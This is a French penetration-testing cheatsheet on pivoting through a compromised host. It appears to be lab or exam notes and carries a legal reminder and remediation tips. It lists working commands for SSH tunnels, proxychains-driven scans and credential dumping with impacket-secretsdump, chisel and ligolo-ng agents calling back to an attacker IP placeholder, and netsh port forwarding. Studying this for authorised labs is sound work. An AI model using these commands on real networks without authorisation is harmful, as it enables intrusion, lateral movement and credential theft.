# Cheatsheet — pivoting & tunnels

Après un premier accès (**foothold**), atteindre les machines/ports **non routables** depuis la Kali en faisant **rebondir** le trafic à travers la cible compromise. Compétence clé des réseaux internes (AD, Pro Labs type Dante).

**Rappel légal : uniquement sur tes labs et les périmètres autorisés par écrit (art. 323-1 du Code pénal).**

---

## 0. Le vocabulaire

- **Pivot** : la machine compromise qui sert de relais vers le réseau interne.
- **Agent / implant** : le binaire déposé sur le pivot qui ouvre le tunnel.
- **SOCKS proxy** : un port local (ex. `1080`) qui envoie tout le trafic *à travers* le pivot.
- **proxychains** : force n'importe quel outil (nmap, nxc, evil-winrm…) à passer par ce SOCKS.

Workflow type : *foothold → monter un SOCKS via le pivot → `proxychains <outil> <cible interne>`*.

---

## 1. Repérer un réseau interne à atteindre
```bash
# sur le pivot :
ip a ; ip r                 # 2e interface / route vers un réseau privé ?
arp -a                      # voisins
cat /etc/hosts
# scan rapide d'un hôte interne (sans outil) :
for p in 22 80 445 3389 1433; do (echo >/dev/tcp/10.10.20.5/$p) 2>/dev/null && echo "$p open"; done
```

---

## 2. Tunnels SSH (si on a un accès SSH)

```bash
# -L : port LOCAL -> service interne  (local forward)
ssh -L 8080:10.10.20.5:80 user@pivot      # 127.0.0.1:8080 (Kali) = 10.10.20.5:80 (interne)

# -R : port sur le PIVOT -> service chez moi (remote forward)  [exfil, callbacks]
ssh -R 9001:127.0.0.1:9001 user@pivot

# -D : proxy SOCKS DYNAMIQUE (le plus puissant) -> tout le sous-réseau
ssh -D 1080 user@pivot                    # 127.0.0.1:1080 = SOCKS vers le réseau du pivot

# -J : rebond multi-sauts (ProxyJump)
ssh -J user@pivot1 user@pivot2

# options utiles : -f -N (arrière-plan, pas de shell) ; -C (compression)
ssh -fN -D 1080 user@pivot
```

---

## 3. proxychains (router n'importe quel outil)

```bash
sudo nano /etc/proxychains4.conf
#   -> dernière ligne : socks5 127.0.0.1 1080   (quiet_mode décommenté = moins verbeux)
```
```bash
proxychains nmap -sT -Pn -p 445,3389 10.10.20.5     # nmap doit être en -sT (TCP connect)
proxychains nxc smb 10.10.20.0/24
proxychains evil-winrm -i 10.10.20.5 -u admin -p '...'
proxychains impacket-secretsdump dom/user:pass@10.10.20.5
```
> ⚠️ proxychains ne fait passer que du **TCP** ; `nmap` doit être en **`-sT -Pn`** (pas de SYN brut, pas de ping à travers un SOCKS).

---

## 4. chisel (quand pas de SSH — reverse SOCKS)

Un seul binaire Go (serveur + client), idéal en reverse (le pivot se connecte à toi).
```bash
# chez moi (Kali) — serveur qui écoute :
./chisel server -p 8000 --reverse

# sur le pivot (binaire déposé) — client en reverse SOCKS :
./chisel client <MON_IP>:8000 R:socks
# -> ouvre un SOCKS sur 127.0.0.1:1080 côté Kali -> proxychains comme au-dessus
```
Port-forward simple (sans SOCKS) :
```bash
./chisel client <MON_IP>:8000 R:3389:10.10.20.5:3389   # RDP interne -> 127.0.0.1:3389 Kali
```

---

## 5. ligolo-ng (le plus confortable aujourd'hui)

Crée une **interface tun** : le réseau interne devient routable **nativement** (pas besoin de proxychains).
```bash
# Kali : préparer l'interface + le proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                      # écoute (ex. :11601)

# pivot : lancer l'agent
./agent -connect <MON_IP>:11601 -ignore-cert

# dans la console ligolo : session -> puis ajouter la route du réseau interne
#   (sur Kali) sudo ip route add 10.10.20.0/24 dev ligolo
# -> ensuite : nmap/nxc/evil-winrm DIRECT sur 10.10.20.x, sans proxychains
```
> Avantage : `nmap -sS`, UDP, tout marche comme si tu étais dans le LAN.

---

## 6. sshuttle (VPN-like, rapide à mettre)
```bash
sshuttle -r user@pivot 10.10.20.0/24       # route tout ce sous-réseau via SSH, transparent
```

---

## 7. Côté Windows (pivot Windows)

```cmd
:: port-forward natif Windows (netsh)
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.20.5
:: nettoyage :
netsh interface portproxy reset
```
`plink.exe -D 1080 user@pivot` (SOCKS via SSH depuis Windows) · chisel.exe / ligolo agent.exe fonctionnent aussi.

---

## 8. À savoir expliquer à l'oral

- **Pourquoi pivoter** : le réseau interne (AD, DB) n'est pas routable depuis Internet/la Kali ; la machine compromise, elle, y a accès.
- **SOCKS dynamique (`-D` / chisel R:socks)** vs **port-forward (`-L`)** : l'un ouvre TOUT le sous-réseau, l'autre un seul service.
- **proxychains = TCP only + nmap `-sT -Pn`** : question piège classique.
- **ligolo-ng** : route au niveau IP (interface tun) → plus besoin de proxychains, supporte plus de protocoles.
- **Remédiation** : segmentation réseau, filtrage est-ouest, détection des binaires de tunnel (chisel/ligolo), surveillance des connexions sortantes inhabituelles.

## Références
- Fiches liées : [impacket](impacket.md) · [smb](smb.md) · [ad-memo](ad-memo.md) · [reverse-shells](reverse-shells.md)
